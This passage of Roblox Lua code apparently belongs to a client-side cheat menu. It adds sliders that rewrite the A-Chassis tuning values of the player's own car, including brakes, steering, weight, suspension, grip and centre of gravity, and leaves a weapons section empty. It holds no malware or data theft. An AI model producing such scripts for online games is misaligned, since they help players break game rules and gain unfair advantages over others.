				return autoFolder:GetChildren()[1]
			end

			local car = getPlayerCar(LocalPlayer.Name)
			if not car or not car:FindFirstChild("A-Chassis Tune") then return end
			local tune = require(car:FindFirstChild("A-Chassis Tune"))
			tune.RBrakeForce = v
		end,
	})

	-- =========================================================
	--  Handbrake Force
	-- =========================================================
	Manager:CreateSlider({
		Menu = "Voertuig",
		Name = "Handbrake Force",
		Min = 500, Max = 20000, Default = 2000,
		Callback = function(v)
			local Players     = game:GetService("Players")
			local LocalPlayer = Players.LocalPlayer

			local function getPlayerCar(plrName)
				local spelers = workspace:FindFirstChild("Spelers")
				if not spelers then return nil end
				local plrFolder = spelers:FindFirstChild(plrName)
				if not plrFolder then return nil end
				local autoFolder = plrFolder:FindFirstChild("Voertuig")
				if not autoFolder then return nil end
				return autoFolder:GetChildren()[1]
			end

			local car = getPlayerCar(LocalPlayer.Name)
			if not car or not car:FindFirstChild("A-Chassis Tune") then return end
			local tune = require(car:FindFirstChild("A-Chassis Tune"))
			tune.PBrakeForce = v
		end,
	})

	-- =========================================================
	--  Steering Max Torque
	-- =========================================================
	Manager:CreateSlider({
		Menu = "Voertuig",
		Name = "Steer Torque",
		Min = 1000, Max = 500000, Default = 50000,
		Callback = function(v)
			local Players     = game:GetService("Players")
			local LocalPlayer = Players.LocalPlayer

			local function getPlayerCar(plrName)
				local spelers = workspace:FindFirstChild("Spelers")
				if not spelers then return nil end
				local plrFolder = spelers:FindFirstChild(plrName)
				if not plrFolder then return nil end
				local autoFolder = plrFolder:FindFirstChild("Voertuig")
				if not autoFolder then return nil end
				return autoFolder:GetChildren()[1]
			end

			local car = getPlayerCar(LocalPlayer.Name)
			if not car or not car:FindFirstChild("A-Chassis Tune") then return end
			local tune = require(car:FindFirstChild("A-Chassis Tune"))
			tune.SteerMaxTorque = v
		end,
	})

	-- =========================================================
	--  Steering Speed
	-- =========================================================
	Manager:CreateSlider({
		Menu = "Voertuig",
		Name = "Steer Speed",
		Min = 0.01, Max = 0.5, Default = 0.07, Increment = 0.01,
		Callback = function(v)
			local Players     = game:GetService("Players")
			local LocalPlayer = Players.LocalPlayer

			local function getPlayerCar(plrName)
				local spelers = workspace:FindFirstChild("Spelers")
				if not spelers then return nil end
				local plrFolder = spelers:FindFirstChild(plrName)
				if not plrFolder then return nil end
				local autoFolder = plrFolder:FindFirstChild("Voertuig")
				if not autoFolder then return nil end
				return autoFolder:GetChildren()[1]
			end

			local car = getPlayerCar(LocalPlayer.Name)
			if not car or not car:FindFirstChild("A-Chassis Tune") then return end
			local tune = require(car:FindFirstChild("A-Chassis Tune"))
			tune.SteerSpeed = v
		end,
	})

	-- =========================================================
	--  Steering Angle
	-- =========================================================
	Manager:CreateSlider({
		Menu = "Voertuig",
		Name = "Steer Angle",
		Min = 10, Max = 90, Default = 60,
		Callback = function(v)
			local Players     = game:GetService("Players")
			local LocalPlayer = Players.LocalPlayer

			local function getPlayerCar(plrName)
				local spelers = workspace:FindFirstChild("Spelers")
				if not spelers then return nil end
				local plrFolder = spelers:FindFirstChild(plrName)
				if not plrFolder then return nil end
				local autoFolder = plrFolder:FindFirstChild("Voertuig")
				if not autoFolder then return nil end
				return autoFolder:GetChildren()[1]
			end

			local car = getPlayerCar(LocalPlayer.Name)
			if not car or not car:FindFirstChild("A-Chassis Tune") then return end
			local tune = require(car:FindFirstChild("A-Chassis Tune"))
			tune.SteerInner = v
			tune.SteerOuter = v
		end,
	})

	-- =========================================================
	--  Weight
	-- =========================================================
	Manager:CreateSlider({
		Menu = "Voertuig",
		Name = "Weight",
		Min = 500, Max = 10000, Default = 3500,
		Suffix = " kg",
		Callback = function(v)
			local Players     = game:GetService("Players")
			local LocalPlayer = Players.LocalPlayer

			local function getPlayerCar(plrName)
				local spelers = workspace:FindFirstChild("Spelers")
				if not spelers then return nil end
				local plrFolder = spelers:FindFirstChild(plrName)
				if not plrFolder then return nil end
				local autoFolder = plrFolder:FindFirstChild("Voertuig")
				if not autoFolder then return nil end
				return autoFolder:GetChildren()[1]
			end

			local car = getPlayerCar(LocalPlayer.Name)
			if not car or not car:FindFirstChild("A-Chassis Tune") then return end
			local tune = require(car:FindFirstChild("A-Chassis Tune"))
			tune.Weight = v
		end,
	})

	-- =========================================================
	--  Suspension Stiffness
	-- =========================================================
	Manager:CreateSlider({
		Menu = "Voertuig",
		Name = "Susp Stiffness",
		Min = 500, Max = 20000, Default = 4500,
		Callback = function(v)
			local Players     = game:GetService("Players")
			local LocalPlayer = Players.LocalPlayer

			local function getPlayerCar(plrName)
				local spelers = workspace:FindFirstChild("Spelers")
				if not spelers then return nil end
				local plrFolder = spelers:FindFirstChild(plrName)
				if not plrFolder then return nil end
				local autoFolder = plrFolder:FindFirstChild("Voertuig")
				if not autoFolder then return nil end
				return autoFolder:GetChildren()[1]
			end

			local car = getPlayerCar(LocalPlayer.Name)
			if not car or not car:FindFirstChild("A-Chassis Tune") then return end
			local tune = require(car:FindFirstChild("A-Chassis Tune"))
			tune.FSusStiffness = v
			tune.RSusStiffness = v
		end,
	})

	-- =========================================================
	--  Suspension Damping
	-- =========================================================
	Manager:CreateSlider({
		Menu = "Voertuig",
		Name = "Susp Damping",
		Min = 10, Max = 1000, Default = 200,
		Callback = function(v)
			local Players     = game:GetService("Players")
			local LocalPlayer = Players.LocalPlayer

			local function getPlayerCar(plrName)
				local spelers = workspace:FindFirstChild("Spelers")
				if not spelers then return nil end
				local plrFolder = spelers:FindFirstChild(plrName)
				if not plrFolder then return nil end
				local autoFolder = plrFolder:FindFirstChild("Voertuig")
				if not autoFolder then return nil end
				return autoFolder:GetChildren()[1]
			end

			local car = getPlayerCar(LocalPlayer.Name)
			if not car or not car:FindFirstChild("A-Chassis Tune") then return end
			local tune = require(car:FindFirstChild("A-Chassis Tune"))
			tune.FSusDamping = v
			tune.RSusDamping = v
		end,
	})

	-- =========================================================
	--  Suspension Length
	-- =========================================================
	Manager:CreateSlider({
		Menu = "Voertuig",
		Name = "Susp Length",
		Min = 0.5, Max = 6, Default = 2, Increment = 0.1,
		Callback = function(v)
			local Players     = game:GetService("Players")
			local LocalPlayer = Players.LocalPlayer

			local function getPlayerCar(plrName)
				local spelers = workspace:FindFirstChild("Spelers")
				if not spelers then return nil end
				local plrFolder = spelers:FindFirstChild(plrName)
				if not plrFolder then return nil end
				local autoFolder = plrFolder:FindFirstChild("Voertuig")
				if not autoFolder then return nil end
				return autoFolder:GetChildren()[1]
			end

			local car = getPlayerCar(LocalPlayer.Name)
			if not car or not car:FindFirstChild("A-Chassis Tune") then return end
			local tune = require(car:FindFirstChild("A-Chassis Tune"))
			tune.FSusLength = v
			tune.RSusLength = v
		end,
	})

	-- =========================================================
	--  Anti-Roll
	-- =========================================================
	Manager:CreateSlider({
		Menu = "Voertuig",
		Name = "Anti-Roll",
		Min = 0, Max = 500, Default = 50,
		Callback = function(v)
			local Players     = game:GetService("Players")
			local LocalPlayer = Players.LocalPlayer

			local function getPlayerCar(plrName)
				local spelers = workspace:FindFirstChild("Spelers")
				if not spelers then return nil end
				local plrFolder = spelers:FindFirstChild(plrName)
				if not plrFolder then return nil end
				local autoFolder = plrFolder:FindFirstChild("Voertuig")
				if not autoFolder then return nil end
				return autoFolder:GetChildren()[1]
			end

			local car = getPlayerCar(LocalPlayer.Name)
			if not car or not car:FindFirstChild("A-Chassis Tune") then return end
			local tune = require(car:FindFirstChild("A-Chassis Tune"))
			tune.FAntiRoll = v
			tune.RAntiRoll = v
		end,
	})

	-- =========================================================
	--  Gyro Damping  (stability / grip)
	-- =========================================================
	Manager:CreateSlider({
		Menu = "Voertuig",
		Name = "Grip (Gyro Damp)",
		Min = 10, Max = 5000, Default = 100,
		Callback = function(v)
			local Players     = game:GetService("Players")
			local LocalPlayer = Players.LocalPlayer

			local function getPlayerCar(plrName)
				local spelers = workspace:FindFirstChild("Spelers")
				if not spelers then return nil end
				local plrFolder = spelers:FindFirstChild(plrName)
				if not plrFolder then return nil end
				local autoFolder = plrFolder:FindFirstChild("Voertuig")
				if not autoFolder then return nil end
				return autoFolder:GetChildren()[1]
			end

			local car = getPlayerCar(LocalPlayer.Name)
			if not car or not car:FindFirstChild("A-Chassis Tune") then return end
			local tune = require(car:FindFirstChild("A-Chassis Tune"))
			tune.FGyroDamp = v
			tune.RGyroDamp = v
		end,
	})

	-- =========================================================
	--  Center of Gravity Height  (lower = less rollover)
	-- =========================================================
	Manager:CreateSlider({
		Menu = "Voertuig",
		Name = "CG Height",
		Min = 0.1, Max = 5, Default = 1.8, Increment = 0.1,
		Callback = function(v)
			local Players     = game:GetService("Players")
			local LocalPlayer = Players.LocalPlayer

			local function getPlayerCar(plrName)
				local spelers = workspace:FindFirstChild("Spelers")
				if not spelers then return nil end
				local plrFolder = spelers:FindFirstChild(plrName)
				if not plrFolder then return nil end
				local autoFolder = plrFolder:FindFirstChild("Voertuig")
				if not autoFolder then return nil end
				return autoFolder:GetChildren()[1]
			end

			local car = getPlayerCar(LocalPlayer.Name)
			if not car or not car:FindFirstChild("A-Chassis Tune") then return end
			local tune = require(car:FindFirstChild("A-Chassis Tune"))
			tune.CGHeight = v
		end,
	})

	-- =========================================================
	--  WAPEN
	-- =========================================================



	-- Placeholder buttons that don't do anything yet

	-- =========================================================
	--  Other menus — empty for now, just so the pages exist
	-- =========================================================

end
coroutine.wrap(DJOXJ_fake_script)()
